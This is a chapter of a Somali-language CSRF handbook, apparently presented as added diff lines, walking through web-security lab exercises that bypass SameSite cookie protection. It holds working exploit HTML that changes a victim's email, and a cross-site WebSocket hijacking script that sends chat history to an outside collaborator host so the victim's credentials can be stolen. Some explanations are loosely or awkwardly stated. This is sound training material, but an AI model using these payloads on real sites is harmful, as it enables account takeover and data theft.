+<aside class="callout callout--note" role="note" data-reveal><span class="callout__icon"><svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><circle cx="12" cy="12" r="9" fill="none" stroke="currentColor" stroke-width="2"/><path d="M12 11v5M12 8h.01" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg></span><p class="callout__text" id="part-7-b65">Ogeysiis: Exploit server Head section-ka ku dar <code>Referrer-Policy: unsafe-url</code>.</p></aside>
+<p id="part-7-b66" data-reveal>Tallaabo 5: Deliver</p>
+<ul class="doc-list" data-reveal><li>Beddel email-ka.</li><li>Store, Deliver.</li></ul>
+<h2 id="part-7-b68" class="section-title" data-reveal>Lab-ka 9: SameSite Lax via Method Override </h2>
+<p id="part-7-b69" data-reveal>Lab-kan wuxuu leeyahay SameSite=Lax. Cookie-ga lama diro cross-site POST, laakiin waa la diraa cross-site GET top-level navigation. Server-ku wuxuu ogolaadaa <code>_method=POST</code>.</p>
+<h3 id="part-7-b70" class="subsection-title" data-reveal>Top-Level Navigation</h3>
+<p id="part-7-b71" data-reveal>Top-level navigation waa marka browser-ku uu si toos ah ugu leexdo URL cusub. Waa user-intended. Waa deliberate. Waa conscious.</p>
+<p id="part-7-b72" data-reveal>Top-level navigation waa signal. Waa marker. Waa proof of intent. Marka user-ku uu booqdo <code>bank.com</code>, waa intentional. Marka <code>&lt;img&gt;</code> uu soo raro <code>bank.com</code>, waa incidental.</p>
+<p id="part-7-b73" data-reveal>SameSite=Lax wuxuu aaminsan yahay top-level navigation. Wuxuu yiraahdaa: "Haddii uu top-level yahay, waa user-intended." Laakiin top-level navigation wuxuu noqon karaa attacker-controlled:</p>
+<ul class="doc-list" data-reveal><li><code>document.location = "https://..."</code> — top-level.</li><li><code>&lt;a href="</code><code>https:</code><code>//..."&gt;</code> — top-level.</li><li><code>&lt;form action="</code><code>https:</code><code>//..."&gt;</code> — top-level.</li></ul>
+<h3 id="part-7-b75" class="subsection-title" data-reveal>Method Override</h3>
+<p id="part-7-b76" data-reveal>Method override Waa marka method-ka la beddelo. Waa marka POST noqdo GET ama GET noqdo POST.</p>
+<p id="part-7-b77" data-reveal>Method override wuxuu yiraahdaa: "Haddii method-ku aanu shaqeyn, isku day mid kale."</p>
+<p id="part-7-b78" data-reveal>Method override wuxuu u ogolaataa attacker inuu GET u beddelo POST. SameSite=Lax wuxuu aqbalayaa GET top-level. Marka, CSRF wuu shaqeeyaa.</p>
+<p id="part-7-b79" data-reveal>Tusaale:</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">text</span><span class="code-panel__lines">1 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="">GET /change-email?email=attacker&amp;_method=POST</code></pre></figure>
+<p id="part-7-b81" data-reveal>Server-ku wuxuu u arkaa POST. SameSite=Lax wuxuu u arkaa GET. Labaduba waa kala duwan. yihiin Waa gap.</p>
+<h3 id="part-7-b82" class="subsection-title" data-reveal>Sida Loo Tijaabiyo</h3>
+<p id="part-7-b83" data-reveal>Tallaabo 1: Login wiener</p>
+<ul class="doc-list" data-reveal><li>Eeg <code>Set-Cookie</code>: <code>SameSite=Lax</code>.</li></ul>
+<p id="part-7-b85" data-reveal>Tallaabo 2: Tijaabi GET</p>
+<ul class="doc-list" data-reveal><li>Repeater ku dir GET request.</li><li>Riix Send.</li><li>Haddii la aqbalo → waa shaqeynaysaa.</li></ul>
+<p id="part-7-b87" data-reveal>Tallaabo 3: Tijaabi method override</p>
+<ul class="doc-list" data-reveal><li>Ku dar <code>_method=POST</code> query string-ka.</li><li>Riix Send.</li><li>Haddii la aqbalo → waa vulnerable.</li></ul>
+<p id="part-7-b89" data-reveal>Tallaabo 4: Samee exploit</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">html</span><span class="code-panel__lines">3 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="language-markup">&lt;script&gt;
+    document.location = "https://LAB-ID.web-security-academy.net/my-account/change-email?email=attacker@evil.com&amp;_method=POST";
+&lt;/script&gt;</code></pre></figure>
+<p id="part-7-b91" data-reveal>Tallaabo 5: Deliver</p>
+<ul class="doc-list" data-reveal><li>Beddel email-ka.</li><li>Store, Deliver.</li></ul>
+<h2 id="part-7-b93" class="section-title" data-reveal>Lab-ka 10: SameSite Strict via Client-Side Redirect — </h2>
+<p id="part-7-b94" data-reveal>Lab-kan wuxuu leeyahay SameSite=Strict. Cookie-ga lama diro cross-site . Laakiin lab-kan wuxuu leeyahay client-side redirect gadget oo sameeya request labaad oo same-site ah.</p>
+<p id="part-7-b95" data-reveal>Lab-kan wuxuu ku barayaa in SameSite=Strict aanu ilaalin haddii site-ku leeyahay gadget. Wuxuu ku barayaa in defense-in-depth aanu ku filnayn.</p>
+<h3 id="part-7-b96" class="subsection-title" data-reveal> Gadget-ka</h3>
+<p id="part-7-b97" data-reveal>Gadget wuxuu u ogolaataa attacker inuu u gudbo defense-ka. Wuxuu u ogolaataa attacker inuu sameeyo request labaad.</p>
+<p id="part-7-b98" data-reveal>Tusaale:</p>
+<ul class="doc-list" data-reveal><li>Request 1: Cross-site, top-level, GET → <code>/post/comment/confirmation</code><code>?postId</code><code>=...</code> (ma u baahna cookie).</li><li>Request 2: Same-site, top-level, GET → <code>/my-account/change-email</code><code>?email</code><code>=...</code> (cookie waa la diraa).</li></ul>
+<p id="part-7-b100" data-reveal>Request 1 waa bridge. Request 2 waa action. Labaduba waa same-site. SameSite=Strict wuxuu aqbalayaa same-site. Marka, CSRF wuu shaqeeyaa.</p>
+<h3 id="part-7-b101" class="subsection-title" data-reveal>Client-Side Redirect</h3>
+<p id="part-7-b102" data-reveal>Client-side redirect Waa marka JavaScript uu sameeyo redirect. Waa marka browser-ku uu sameeyo request labaad.</p>
+<p id="part-7-b103" data-reveal>Client-side redirect wuxuu u arkaa browser-ka in request-ka labaad uu yimid isla site-ka. Waa same-site. Cookie-ga waa la diraa.</p>
+<p id="part-7-b104" data-reveal>Dhibaatada: Client-side redirect wuxuu u ogolaataa attacker inuu maamulo halka request-ku u socdo. Wuxuu u ogolaataa attacker inuu sameeyo request labaad.</p>
+<p id="part-7-b105" data-reveal>Tusaale:</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">javascript</span><span class="code-panel__lines">1 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="language-javascript">window.location.href = '/post/' + postId;  // postId = '1/../../my-account/change-email?email=...'</code></pre></figure>
+<p id="part-7-b107" data-reveal>Browser-ku wuxuu normalize-gareeyaa:</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">text</span><span class="code-panel__lines">2 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="">/post/1/../../my-account/change-email?email=...
+→ /my-account/change-email?email=...</code></pre></figure>
+<h3 id="part-7-b109" class="subsection-title" data-reveal> Sida Loo Tijaabiyo</h3>
+<p id="part-7-b110" data-reveal>Tallaabo 1: Login wiener</p>
+<ul class="doc-list" data-reveal><li>Eeg <code>Set-Cookie</code>: <code>SameSite=Strict</code>.</li></ul>
+<p id="part-7-b112" data-reveal>Tallaabo 2: Tijaabi GET</p>
+<ul class="doc-list" data-reveal><li>Repeater ku dir GET request.</li><li>Riix Send.</li><li>Haddii la aqbalo → waa shaqeynaysaa.</li></ul>
+<p id="part-7-b114" data-reveal>Tallaabo 3: Hel gadget</p>
+<ul class="doc-list" data-reveal><li>Comment soo dir blog post.</li><li>Eeg Burp: <code>/post/comment/confirmation</code><code>?postId</code><code>=1</code>.</li><li>Eeg JavaScript: <code>commentConfirmationRedirect.js</code>.</li></ul>
+<p id="part-7-b116" data-reveal>Tallaabo 4: Tijaabi path traversal</p>
+<ul class="doc-list" data-reveal><li>Browser-ka booqo: <code>/post/comment/confirmation</code><code>?postId</code><code>=1/../../my-account</code>.</li><li>Haddii uu u leexdo <code>/my-account</code> → waa shaqeynaysaa.</li></ul>
+<p id="part-7-b118" data-reveal>Tallaabo 5: Samee exploit</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">html</span><span class="code-panel__lines">3 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="language-markup">&lt;script&gt;
+    document.location = "https://LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker%40evil.com%26submit=1";
+&lt;/script&gt;</code></pre></figure>
+<p id="part-7-b120" data-reveal>Tallaabo 6: Deliver</p>
+<ul class="doc-list" data-reveal><li>Beddel email-ka.</li><li>Store, Deliver.</li></ul>
+<h2 id="part-7-b122" class="section-title" data-reveal>Lab-ka 11: SameSite Strict via Sibling Domain (CSWSH) </h2>
+<p id="part-7-b123" data-reveal>Lab-kan wuxuu leeyahay SameSite=Strict. Laakiin wuxuu leeyahay sibling domain (<code>cms-...</code>) oo leh XSS. Attacker wuxuu u isticmaalaa XSS-ka si uu CSWSH uga sameeyo main domain-ka.</p>
+<p id="part-7-b124" data-reveal>Lab-kan wuxuu ku barayaa in SameSite=Strict aanu ilaalin haddii sibling domain jiro. Wuxuu ku barayaa in "site" uu yahay mid ka weyn "origin".</p>
+<p id="part-7-b125" data-reveal>Sibling domain waa domain oo wadaaga hal site. Tusaale:</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">text</span><span class="code-panel__lines">2 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="">example.com
+cms.example.com</code></pre></figure>
+<p id="part-7-b127" data-reveal>Dhibaatada: Sibling domain wuxuu noqon karaa bridge. Haddii attacker uu XSS ku helo sibling domain-ka, wuxuu maamulaa browser-ka victim. Wuxuu sameeyaa request u socda main domain-ka. Waa same-site. Cookie-ga waa la diraa.</p>
+<h3 id="part-7-b128" class="subsection-title" data-reveal>XSS on Sibling Domain</h3>
+<p id="part-7-b129" data-reveal>XSS waa code execution. XSS on sibling domain wuxuu u ogolaataa attacker inuu maamulo browser-ka victim gudaha site-ka. Wuxuu sameeyaa request kasta. Wuxuu akhriyaa response kasta.</p>
+<p id="part-7-b130" data-reveal>Tusaale:</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">javascript</span><span class="code-panel__lines">5 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="language-javascript">var ws = new WebSocket('wss://target.com/chat');
+ws.onopen = function() { ws.send("READY"); };
+ws.onmessage = function(event) {
+    fetch('https://collaborator.oastify.com', {method: 'POST', body: event.data});
+};</code></pre></figure>
+<h3 id="part-7-b132" class="subsection-title" data-reveal>CSWSH</h3>
+<p id="part-7-b133" data-reveal>CSWSH waa Cross-Site WebSocket Hijacking. Waa CSRF nooca WebSocket.</p>
+<p id="part-7-b134" data-reveal>CSWSH wuxuu u baahan yahay WebSocket handshake. Waa GET. Waa cookie-based. Ma leh CSRF token.</p>
+<p id="part-7-b135" data-reveal>Dhibaatada: CSWSH wuxuu u baahan yahay same-site. Haddii attacker uu XSS ku helo sibling domain, wuxuu sameeyaa CSWSH. Waa same-site. Cookie-ga waa la diraa.</p>
+<h3 id="part-7-b136" class="subsection-title" data-reveal>7.7.5 Sida Loo Tijaabiyo</h3>
+<p id="part-7-b137" data-reveal>Tallaabo 1: Login wiener</p>
+<ul class="doc-list" data-reveal><li>Eeg <code>Set-Cookie</code>: <code>SameSite=Strict</code>.</li><li>Eeg WebSocket handshake: ma jiro CSRF token.</li></ul>
+<p id="part-7-b139" data-reveal>Tallaabo 2: Tijaabi CSWSH toos ah</p>
+<ul class="doc-list" data-reveal><li>Exploit server ku dir CSWSH payload.</li><li>Collaborator wuxuu helaa interaction.</li><li>Laakiin chat history waa mid cusub (cookie lama dirin).</li></ul>
+<p id="part-7-b141" data-reveal>Tallaabo 3: Hel sibling domain</p>
+<ul class="doc-list" data-reveal><li>Burp &gt; responses-ka resources-ka &gt; <code>Access-Control-Allow-Origin: cms-...</code>.</li></ul>
+<p id="part-7-b143" data-reveal>Tallaabo 4: XSS on sibling domain</p>
+<ul class="doc-list" data-reveal><li>Booqo <code>cms-...</code>.</li><li>Login <code>username=&lt;script&gt;</code><code>alert(</code><code>1)&lt;/script&gt;</code>.</li><li>Alert(1) wuu kiciyaa.</li></ul>
+<p id="part-7-b145" data-reveal>Tallaabo 5: Samee exploit chain</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">html</span><span class="code-panel__lines">3 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="language-markup">&lt;script&gt;
+    document.location = "https://cms-LAB-ID.web-security-academy.net/login?username=URL-ENCODED-CSWSH&amp;password=anything";
+&lt;/script&gt;</code></pre></figure>
+<p id="part-7-b147" data-reveal>Tallaabo 6: Deliver</p>
+<ul class="doc-list" data-reveal><li>Store, Deliver.</li><li>Collaborator &gt; Poll now.</li><li>Chat history wuu soo baxaa.</li><li>Ka hel username iyo password victim-ka.</li><li>Login victim-ka → lab solved.</li></ul>
+<h2 id="part-7-b149" class="section-title" data-reveal>Lab-ka 12: SameSite Lax via Cookie Refresh </h2>
+<p id="part-7-b150" data-reveal>Lab-kan wuxuu leeyahay SameSite=Lax. Laakiin SameSite=Lax wuxuu leeyahay 2-minute window — haddii cookie la cusboonaysiiyo, wuxuu u dhaqmaa sida None.</p>
+<h3 id="part-7-b151" class="subsection-title" data-reveal>Cookie Refresh</h3>
+<p id="part-7-b152" data-reveal>Cookie refresh waa falsafad. Waa marka cookie-ga la cusboonaysiiyo. Waa marka browser-ku uu helo Set-Cookie cusub.</p>
+<p id="part-7-b153" data-reveal>SameSite=Lax wuxuu leeyahay window. Wuxuu yiraahdaa: "Haddii cookie-ga la cusboonaysiiyo, wuxuu u dhaqmaa sida None." Waa 2-minute window.</p>
+<p id="part-7-b154" data-reveal>Dhibaatada: Attacker-ku wuxuu cusboonaysiin karaa cookie-ga. Wuxuu furi karaa window-ka. Wuxuu diraa POST.</p>
+<p id="part-7-b155" data-reveal>Tusaale:</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">html</span><span class="code-panel__lines">12 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="language-markup">&lt;script&gt;
+    // Step 1: Refresh cookie
+    window.open('https://target.com/');
+    
+    // Step 2: Wait 1 second, then submit
+    setTimeout(function() {
+        document.forms[0].submit();
+    }, 1000);
+&lt;/script&gt;
+&lt;form method="POST" action="https://target.com/change-email"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;</code></pre></figure>
+<h3 id="part-7-b157" class="subsection-title" data-reveal>7.8.4 Sida Loo Tijaabiyo</h3>
+<p id="part-7-b158" data-reveal>Tallaabo 1: Login wiener</p>
+<ul class="doc-list" data-reveal><li>Eeg <code>Set-Cookie</code>: <code>SameSite=Lax</code>.</li></ul>
+<p id="part-7-b160" data-reveal>Tallaabo 2: Tijaabi POST</p>
+<ul class="doc-list" data-reveal><li>Repeater ku dir POST request.</li><li>Riix Send.</li><li>Haddii la diido → SameSite=Lax wuu shaqeynayaa.</li></ul>
+<p id="part-7-b162" data-reveal>Tallaabo 3: Tijaabi cookie refresh</p>
+<ul class="doc-list" data-reveal><li>Furi <code>https://target.com/</code> (bog cusub).</li><li>Sug 1 ilbiriqsi.</li><li>Dir POST request.</li><li>Haddii la aqbalo → waa vulnerable.</li></ul>
+<p id="part-7-b164" data-reveal>Tallaabo 4: Samee exploit</p>
+<figure class="code-panel" data-reveal><figcaption class="code-panel__head"><span class="code-panel__lang">html</span><span class="code-panel__lines">9 sadar</span><button type="button" class="copy-btn" data-copy aria-label="Copy code to clipboard"><span class="copy-btn__label">Copy</span></button></figcaption><pre class="code-block" tabindex="0"><code class="language-markup">&lt;script&gt;
+    window.open('https://LAB-ID.web-security-academy.net/');
+    setTimeout(function() {
+        document.forms[0].submit();
+    }, 1000);
+&lt;/script&gt;
+&lt;form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email"&gt;
+    &lt;input type="hidden" name="email" value="attacker@evil.com"&gt;
+&lt;/form&gt;</code></pre></figure>
+<p id="part-7-b166" data-reveal>Tallaabo 5: Deliver</p>
+<ul class="doc-list" data-reveal><li>Beddel email-ka.</li><li>Store, Deliver.</li></ul>
+<p id="part-7-b168" data-reveal>.</p>
+<h2 id="part-7-b169" class="section-title" data-reveal>7.9 Falsafadda SameSite: Soo Koobid</h2>
+<h3 id="part-7-b170" class="subsection-title" data-reveal>7.9.1 Saddexda Qiime</h3>
+<div class="table-wrap" role="region" tabindex="0" aria-label="Scrollable table" data-reveal><table class="doc-table"><thead><tr><th scope="col">Qiime</th><th scope="col">Cross-site GET</th><th scope="col">Cross-site POST</th><th scope="col">Subresource</th><th scope="col">Bypass</th></tr></thead><tbody><tr><td>Strict</td><td>❌</td><td>❌</td><td>❌</td><td>Client-side redirect, sibling domain</td></tr><tr><td>Lax</td><td>✅ (top-level)</td><td>❌</td><td>❌</td><td>Method override, cookie refresh</td></tr><tr><td>None</td><td>✅</td><td>✅</td><td>✅</td><td>CSRF waa mid fudud</td></tr></tbody></table></div>
+<p id="part-7-b172" data-reveal>SameSite waa defense-in-depth. Waa layered. Waa bypassable. Waa in la isticmaalaa CSRF token iyo Origin validation.</p>
+<p id="part-7-b173" data-reveal>SameSite wuxuu ku salaysan yahay "site". Laakiin "site" ma aha "origin". Waa mid ka weyn. Waa mid ka duwan.</p>
+<nav class="pager" aria-label="Chapter navigation">
+<a class="pager__link pager__link--prev" href="part-6.html"><span class="pager__dir">Hore</span><span class="pager__title">QAYBTA VI — DHEXDHEXAAD BYPASSES</span></a>
+<span class="pager__spacer"></span>
+</nav>
+    <footer class="site-footer">
+      <p>CSRF Handbook - nuxurka buugga asalka ah, si dhammaystiran loo ilaaliyay.</p>
+      <p class="site-footer__note">Nuxurka waxa uu ka soo jeedaa buugga <em>csrf handbook.docx</em>. Qaybaha UI-ga (badanaha, liisyada iyo boggaga) waa kordhin muuqaal oo aan wax ka beddelin qoraalka asalka ah.</p>
+    </footer>
+  </main>
+  <aside class="onthispage-aside" id="onthispage" aria-label="Boggan gudihiisa">
+<nav class="onthispage" aria-label="On this page">
+<p class="onthispage__title">Boggan</p>
+<ol class="onthispage__list">
+<li class=""><a href="#part-7-b9">Site vs Origin</a></li>
+<li class="is-sub"><a href="#part-7-b10">Fikradda Aasaasiga ah</a></li>
+<li class="is-sub"><a href="#part-7-b20">Site</a></li>
+<li class=""><a href="#part-7-b29">Lab-ka 7: Referer Validation Depends on Header Being Present</a></li>
+<li class="is-sub"><a href="#part-7-b31">Referer</a></li>
+<li class="is-sub"><a href="#part-7-b34">Sida Loo Tijaabiyo</a></li>
+<li class=""><a href="#part-7-b45">Lab-ka 8: Broken Referer Validation</a></li>
+<li class="is-sub"><a href="#part-7-b47">Substring</a></li>
+<li class="is-sub"><a href="#part-7-b51">Falsafadda Contains vs Equals</a></li>
+<li class=""><a href="#part-7-b68">Lab-ka 9: SameSite Lax via Method Override</a></li>
+<li class="is-sub"><a href="#part-7-b70">Top-Level Navigation</a></li>
+<li class="is-sub"><a href="#part-7-b75">Method Override</a></li>
+<li class="is-sub"><a href="#part-7-b82">Sida Loo Tijaabiyo</a></li>
+<li class=""><a href="#part-7-b93">Lab-ka 10: SameSite Strict via Client-Side Redirect —</a></li>
+<li class="is-sub"><a href="#part-7-b96">Gadget-ka</a></li>
+<li class="is-sub"><a href="#part-7-b101">Client-Side Redirect</a></li>
+<li class="is-sub"><a href="#part-7-b109">Sida Loo Tijaabiyo</a></li>
+<li class=""><a href="#part-7-b122">Lab-ka 11: SameSite Strict via Sibling Domain (CSWSH)</a></li>
+<li class="is-sub"><a href="#part-7-b128">XSS on Sibling Domain</a></li>
+<li class="is-sub"><a href="#part-7-b132">CSWSH</a></li>
+<li class="is-sub"><a href="#part-7-b136">7.7.5 Sida Loo Tijaabiyo</a></li>
+<li class=""><a href="#part-7-b149">Lab-ka 12: SameSite Lax via Cookie Refresh</a></li>
+<li class="is-sub"><a href="#part-7-b151">Cookie Refresh</a></li>
+<li class="is-sub"><a href="#part-7-b157">7.8.4 Sida Loo Tijaabiyo</a></li>
+<li class=""><a href="#part-7-b169">7.9 Falsafadda SameSite: Soo Koobid</a></li>
+<li class="is-sub"><a href="#part-7-b170">7.9.1 Saddexda Qiime</a></li>
+</ol></nav>
+  </aside>
+</div>
+<button class="back-to-top" id="back-to-top" type="button" aria-label="Ku noqo korka bogga" hidden>
+  <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path d="M12 19V6M6 12l6-6 6 6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+</button>
+<div class="search-modal" id="search-modal" role="dialog" aria-modal="true" aria-labelledby="search-title" hidden>
+  <div class="search-modal__backdrop" data-search-close></div>
+  <div class="search-modal__panel" role="document">
+    <h2 class="sr-only" id="search-title">Raadi buugga</h2>
+    <div class="search-modal__field">
+      <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><circle cx="11" cy="11" r="7" fill="none" stroke="currentColor" stroke-width="2"/><path d="M20 20l-3.5-3.5" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+      <input type="search" id="search-input" placeholder="Raadi qayb, qayb-hoosaad, eray, koodh..." autocomplete="off" aria-controls="search-results" aria-label="Erayga raadinta">
+      <button type="button" class="search-modal__close" data-search-close aria-label="Xir raadinta">Esc</button>
+    </div>
+    <div class="search-modal__hint" id="search-hint">Qor eray si aad uga raadiso buugga oo dhan.</div>
+    <ol class="search-results" id="search-results" aria-live="polite"></ol>
+  </div>
+</div>
+<script src="../assets/vendor/prism/prism.min.js" defer></script>
+<script src="../assets/vendor/prism/components/prism-markup.min.js" defer></script>
+<script src="../assets/vendor/prism/components/prism-clike.min.js" defer></script>
+<script src="../assets/vendor/prism/components/prism-javascript.min.js" defer></script>
+<script src="../assets/vendor/prism/components/prism-css.min.js" defer></script>
+<script src="../assets/vendor/prism/components/prism-json.min.js" defer></script>
+<script src="../assets/vendor/prism/components/prism-bash.min.js" defer></script>
+<script src="../assets/vendor/prism/components/prism-markup-templating.min.js" defer></script>
+<script src="../assets/vendor/prism/components/prism-php.min.js" defer></script>
+<script src="../assets/vendor/prism/components/prism-http.min.js" defer></script>
+<script src="../assets/js/theme.js" defer></script>
+<script src="../assets/js/navigation.js" defer></script>
+<script src="../assets/js/reading-progress.js" defer></script>
+<script src="../data/search-index.js" defer></script>
+<script src="../assets/js/animations.js" defer></script>
+<script src="../assets/js/search.js" defer></script>
+<script src="../assets/js/app.js" defer></script>
+</body>
+</html>
